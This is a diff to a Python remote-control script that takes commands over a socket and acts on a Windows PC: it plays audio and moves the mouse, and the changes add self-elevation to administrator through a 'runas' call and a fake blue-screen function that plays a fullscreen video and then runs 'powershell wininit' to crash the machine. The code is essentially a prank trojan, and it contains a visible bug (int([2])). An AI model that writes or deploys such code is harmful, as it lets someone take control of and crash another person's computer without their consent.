@@ -4,8 +4,11 @@ import time
 import win32api, win32con
 import threading
 import math
+import os
+import ctypes
 
 #Initilizing things
+ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1) # Runs as admin
 pygame.mixer.init()
 addr = "127.0.0.1"
 port = 4560
@@ -14,11 +17,11 @@ server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.connect((addr, port))
 
 
-def PlayMusic():
-    pygame.mixer.music.load("audio/nclhc.mp3")
+def playAudio(audiopath):
+    pygame.mixer.music.load(audiopath)
     pygame.mixer.music.play()
 
-def StopMusic():
+def stopAudio():
     pygame.mixer.music.stop()
 
 def returnmsg(msg):
@@ -43,20 +46,25 @@ def MoveMouse(x, y):
         print(f'CursorX: {x2} CursorY: {y2}')
         win32api.SetCursorPos((x2, y2))
 
-    #win32api.SetCursorPos((x,y))
-    #win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN,x,y,0,0)
-    #win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP,x,y,0,0)
+def bsod(videopath, waittime):
+    pygame.init()
+    DISPLAYSURF = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
+    movie = pygame.movie.Movie(videopath)
+    movie_screen = pygame.Surface(movie.get_size()).convert()
+    movie.set_display(movie_screen)  
+    movie.play()
+    time.sleep(waittime)
+    os.system('powershell wininit')
 
 def returnScreenRes():
     res = win32api.GetSystemMetrics(0), win32api.GetSystemMetrics(1)
     return res
 
 def parse(args):
-    if args[0] == "music":
-        if args[1] == "play":
-            PlayMusic()
-        else:
-            StopMusic()
+    if args[0] == "audio":
+        playAudio(args[1]) 
+    if args[0] == "audioStop":
+        stopAudio()
     if args[0] == "mm":
         MoveMouse(int(args[1]), int([2]))
     if args[0] == "mmr":
